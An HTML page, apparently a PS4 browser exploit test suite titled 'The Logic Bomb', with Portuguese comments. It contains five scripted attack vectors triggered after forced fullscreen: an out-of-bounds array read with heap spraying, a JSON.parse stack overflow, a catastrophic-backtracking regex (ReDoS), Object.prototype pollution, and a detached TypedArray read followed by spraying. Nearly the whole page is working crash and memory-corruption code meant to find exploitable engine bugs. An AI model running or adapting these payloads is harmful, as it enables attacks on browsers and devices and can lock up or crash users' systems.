<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v560000: The Logic Bomb</title>
<style>
    body { background: #000; color: #f5f; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #f5f; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #202; color: #fff; font-weight: bold;
    }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #303; color: #fff; border: 2px solid #f5f;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #f5f; color: #000; }
    
    #stage { background: #111; height: 100px; border: 1px solid #555; margin-top: 20px; overflow: auto; }
</style>
</head>
<body>

<h1>v560000: THE LOGIC BOMB</h1>

<div class="status" id="msg">
    ESTRUTURA: FULLSCREEN -> ALERTA -> CORRUPÇÃO DE DADOS<br>
    CLIQUE E AGUARDE O ALERTA PARA DAR O GOLPE
</div>

<button onclick="logic(l01)">01. Array Length Kill (OutOfBounds)</button>

<button onclick="logic(l02)">02. JSON.parse Stack Smash</button>

<button onclick="logic(l03)">03. RegExp CPU Lock (ReDoS)</button>

<button onclick="logic(l04)">04. Prototype Chain Poison</button>

<button onclick="logic(l05)">05. TypedArray Buffer Detach</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    
    // Spray Global "AAAA"
    let spray = [];
    const pattern = new Uint32Array(1024).fill(0x41414141);

    function logic(vectorFunc) {
        Stage.innerHTML = "";
        spray = [];
        
        // 1. Setup
        const element = vectorFunc(Stage);
        
        // 2. Fullscreen Imediato
        if (document.body.webkitRequestFullscreen) document.body.webkitRequestFullscreen();
        else if (document.body.requestFullscreen) document.body.requestFullscreen();

        // 3. Agenda a Bomba
        setTimeout(() => {
            if(element._bomb) element._bomb();
        }, 800); 
    }

    // =================================================================
    // 01. Array Length Kill (OutOfBounds)
    // Cria um array grande, alerta o usuário, e subitamente
    // define o tamanho para 0, mas tenta ler os dados antigos.
    // =================================================================
    function l01(stage) {
        const d = document.createElement('div');
        d.innerText = "ARRAY BOMB";
        stage.appendChild(d);

        // Cria array com objetos
        let arr = new Array(10000);
        for(let i=0; i<10000; i++) arr[i] = {id: i, data: "valuable"};

        d._bomb = () => {
            window.alert("⚠️ ARRAY SIZE: 10,000 ⚠️\nAo clicar OK, definimos Length = 0 e lemos o índice 9999.");
            
            // O GOLPE
            arr.length = 0; // "Limpa" a memória lógica
            
            // Tenta acessar memória que o navegador ACHA que está livre
            // Se o JIT (compilador) não checar os limites a tempo -> Crash
            try {
                const ghost = arr[9999];
                if(ghost) console.log(ghost.id);
            } catch(e) {}
            
            // Spray imediato para preencher o vazio
            for(let i=0; i<5000; i++) spray.push(new Uint32Array(pattern));
        };
        return d;
    }

    // =================================================================
    // 02. JSON.parse Stack Smash
    // Cria uma string JSON profundamente aninhada.
    // O parser do JSON usa recursão. Se for fundo demais, estoura a Stack.
    // =================================================================
    function l02(stage) {
        const d = document.createElement('div');
        d.innerText = "JSON BOMB";
        stage.appendChild(d);

        // Cria [[[[...]]]]
        let jsonStr = "1";
        for(let i=0; i<5000; i++) jsonStr = "[" + jsonStr + "]";

        d._bomb = () => {
            window.alert("⚠️ JSON DEEP PARSE ⚠️\nVamos tentar parsear 5000 arrays aninhados.\nClique OK.");
            
            // O GOLPE
            try {
                JSON.parse(jsonStr);
            } catch(e) {
                d.innerText = "Erro pego (Sem crash): " + e.message;
            }
            
            // Se sobreviveu, tenta recarregar forçado
            window.location.reload();
        };
        return d;
    }

    // =================================================================
    // 03. RegExp CPU Lock (ReDoS)
    // Uma expressão regular maliciosa que causa loop exponencial na CPU.
    // Isso trava a thread de JS enquanto o Fullscreen tenta desenhar.
    // =================================================================
    function l03(stage) {
        const d = document.createElement('div');
        d.innerText = "REGEX BOMB";
        stage.appendChild(d);

        const evilRegex = /^((a+)+)+$/;
        const str = "a".repeat(30) + "!"; // Payload que causa backtrack infinito

        d._bomb = () => {
            window.alert("⚠️ REGEX CPU LOCK ⚠️\nAo clicar OK, a CPU vai para 100%.\nO Fullscreen deve travar.");
            
            // O GOLPE
            // Isso deve congelar o navegador por vários segundos/minutos
            evilRegex.test(str);
            
            d.innerText = "Se você lê isso, falhou.";
        };
        return d;
    }

    // =================================================================
    // 04. Prototype Chain Poison
    // Altera o protótipo básico de Object.
    // Isso corrompe TODOS os objetos do navegador instantaneamente.
    // =================================================================
    function l04(stage) {
        const d = document.createElement('div');
        d.innerText = "PROTO POISON";
        stage.appendChild(d);

        d._bomb = () => {
            window.alert("⚠️ PROTOTYPE POLLUTION ⚠️\nVamos injetar lixo em Object.prototype.\nIsso quebra o navegador inteiro.");
            
            // O GOLPE
            // Define uma propriedade getter que lança erro em TODOS os objetos
            try {
                Object.prototype.__defineGetter__('toString', function() {
                    throw "CRASH";
                });
            } catch(e) {}
            
            // Força o navegador a usar toString (ex: atualizar título da aba)
            document.title = {}; 
            
            // Tenta criar elementos novos num ambiente envenenado
            const x = document.createElement('div');
        };
        return d;
    }

    // =================================================================
    // 05. TypedArray Buffer Detach
    // O mais técnico. Cria um Array de Tipos (Int32), transfere o buffer
    // para um Worker (esvaziando o array), mas tenta ler o array original.
    // =================================================================
    function l05(stage) {
        const d = document.createElement('div');
        d.innerText = "BUFFER DETACH";
        stage.appendChild(d);

        const buffer = new ArrayBuffer(1024 * 1024); // 1MB
        const typedArr = new Uint32Array(buffer);
        typedArr[0] = 0x12345678;

        d._bomb = () => {
            window.alert("⚠️ BUFFER DETACH ⚠️\nTransferir memória para Worker e ler endereço antigo.");
            
            // 1. Transfere (Detach)
            try {
                // Transferable objects syntax
                const worker = new Worker(URL.createObjectURL(new Blob([""], {type:"text/javascript"})));
                worker.postMessage(buffer, [buffer]);
            } catch(e) {}
            
            // 2. Acesso ilegal
            // O buffer agora tem tamanho 0. Acesso ao índice 0 deve ser protegido,
            // mas em bugs de otimização, ele lê memória de lixo.
            const val = typedArr[0];
            
            d.innerText = "Valor lido: " + val; // Se ler 'undefined' é seguro. Se ler número estranho ou crashar, é bug.
            
            // Spray
            for(let i=0; i<1000; i++) spray.push(new Uint32Array(pattern));
        };
        return d;
    }

</script>
</body>
</html>
